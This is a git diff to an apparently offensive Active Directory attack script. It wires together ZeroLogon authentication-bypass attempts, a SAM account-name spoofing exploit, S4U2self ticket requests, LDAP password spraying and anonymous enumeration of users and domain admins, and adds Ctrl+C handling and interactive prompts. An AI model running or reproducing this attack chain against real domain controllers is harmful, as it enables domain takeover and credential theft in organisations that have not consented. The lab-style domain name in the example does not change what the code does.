@@ -7,6 +7,7 @@ import os
 import argparse
 import json
 import ldap3
+import signal
 
 from sam_spoof import SamExploit
 from get_desc import LdapSearch
@@ -15,7 +16,17 @@ from utils.helper import GETTGT
 from utils.S4U2self import GETST
 from impacket.dcerpc.v5 import samr, nrpc, epm, transport
 
-def ldap_spray(ldap_searcher, wordlist='/usr/share/wordlists/your_username_wordlist'):
+def exit_loop(signum, frame):
+	global pressed, is_sigint
+	if(pressed < 1):
+		log('Exiting current section')
+		is_sigint = 1
+		pressed += 1
+	else:
+		warn("Exiting ...")
+		exit(0)
+
+def ldap_spray(ldap_searcher, wordlist='THE Wordlist'):
 		with open(wordlist, 'r') as f:
 			words = f.readlines()
 
@@ -58,9 +69,12 @@ def try_auth(dc_handle, dc_ip, target):
 			return None
 
 def atk(dc_handle, dc_ip, target):
+	global is_sigint
 	rpc_con = None
 	for a in range(2000):
-		print('[' + ['-','/','-','\\'][(a // 3) % 4] + ']    \r', end='')
+		if(is_sigint):
+			return
+		print('[' + ['-','\\','/'][(a // 2) % 3] + ']    \r', end='')
 		rpc_con = try_auth(dc_handle, dc_ip, target)
 		if(rpc_con):
 			break
@@ -71,11 +85,16 @@ def atk(dc_handle, dc_ip, target):
 		warn('Target seems to be patch')
 
 def zerologon(DC_dict):
-	log("Script from SecuraBV on github")
+	log("Script from @SecuraBV on github")
+	global is_sigint
 
 	for DC, dc_ip in DC_dict.items():
 		dc_name = DC.split('.')[0].upper()
 		atk('\\\\' + dc_name, dc_ip, dc_name)
+		if(is_sigint):
+			is_sigint = 0
+			log("Exit ZL")
+			return
 
 def parse_dc_file():
 	DC_dict = {}
@@ -99,6 +118,7 @@ def parse_resolver():
 		res = re.match(r'search (.*)', line)
 		if(res is not None):
 			domain_name = res[1]
+			success(f'Domain name: {domain_name}')
 
 	DC_dict = dict()
 	res = dns.resolver.resolve(f'_ldap._tcp.dc._msdcs.{domain_name}', 'SRV')
@@ -114,13 +134,23 @@ def parse_resolver():
 		f.write(f"Domain {domain_name}\n")
 		for a, b in DC_dict.items():
 			f.write(f"{a} {b}\n")
-	return DC_dict
+		success('File dc.txt wrote !')
+		log(f'{len(DC_dict) - 1} DC found')
+
+	return domain_name, DC_dict
 
 if __name__ == '__main__':
 	"""
 	Exemple:
-		python3 ad_pease.py -domain-name sevenkingdoms.local -dc-ip 192.168.56.11
+		python3 ad_try.py
 		"""
+
+	### Handle Ctrl + C
+	is_sigint = 0
+	pressed = 0
+	signal.signal(signal.SIGINT, exit_loop)
+
+
 	parser = argparse.ArgumentParser(add_help = True, description = "Sam account spoofing exploit")
 	parser.add_argument('-dc-name', action='store', metavar = "DC name", help='Hostname of the domain controller to use')
 	parser.add_argument('-domain-name', action='store', metavar = "Domain name", help='Domain name to use')
@@ -136,23 +166,24 @@ if __name__ == '__main__':
 
 	username, password = '', ''
 
-	if(options.use_file is not None):
+	if(options.use_file != False):
 		options.domain_name, DC_dict = parse_dc_file()
 
 	else:
-		DC_dict = parse_resolver()
+		options.domain_name, DC_dict = parse_resolver()
 
-	options.dc_ip, options.dc_name = list(DC_dict.values())[0], list(DC_dict.keys())[0]
+	options.dc_ip, options.dc_name= list(DC_dict.values())[0], list(DC_dict.keys())[0]
 	domain_name , dc_ip = options.domain_name, options.dc_ip
 
 
 	section("LDAP Anonymous")
-	ldap_requester = LdapSearch(domain_name, dc_ip, username, password)
-	ldap_requester.init_all()
-	ldap_requester.exec('users')
-	if(len(ldap_requester.res) != 0):
-		ldap_requester.exec('da')
-		ldap_requester.exec('desc')
+	if(input('Try Ldap anonymous ?(Y/n) ').lower() == 'y'):
+		ldap_requester = LdapSearch(domain_name, dc_ip, username, password)
+		ldap_requester.init_all()
+		ldap_requester.exec('users')
+		if(len(ldap_requester.res) != 0):
+			ldap_requester.exec('da')
+			ldap_requester.exec('desc')
 
 	section('ZeroLogon')
 	if(input('Try zerologon ?(Y/n) ').lower() == 'y'):
@@ -168,6 +199,20 @@ if __name__ == '__main__':
 				save(ldap_requester.account, 'valid_accounts.txt')
 
 			account_found = 1
+		else:
+			if(input("Wanna add an account ? (Y/N) ").lower() == 'y'):
+				username, password = input("Enter username/password: ").strip().split('/')
+				ldap_requester.add_account(username, password)
+				ldap_requester.exec('users')
+				
+				if(len(ldap_requester.res) != 0):
+					success('Account valid')
+					account_found = 1
+				
+				else:
+					warn('Account not valid')
+					account_found = 0
+
 
 	if(account_found):
 		options.u, options.p = list(ldap_requester.account.keys())[0], list(ldap_requester.account.values())[0]
